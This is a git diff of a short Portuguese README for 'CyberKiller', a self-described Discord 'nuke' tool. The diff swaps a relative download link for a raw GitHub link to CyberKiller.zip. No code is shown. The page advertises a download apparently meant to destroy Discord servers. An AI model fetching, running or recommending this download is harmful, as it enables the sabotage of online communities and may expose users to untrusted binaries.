@@ -1,4 +1,4 @@
 # CyberKiller
 Tool Nuke Discord
 
-[Clique aqui para baixar!](./CyberKiller.zip)
+[Baixar! CyberKiller.zip](https://github.com/CyberDevvvv/CyberKiller/raw/refs/heads/main/CyberKiller.zip)
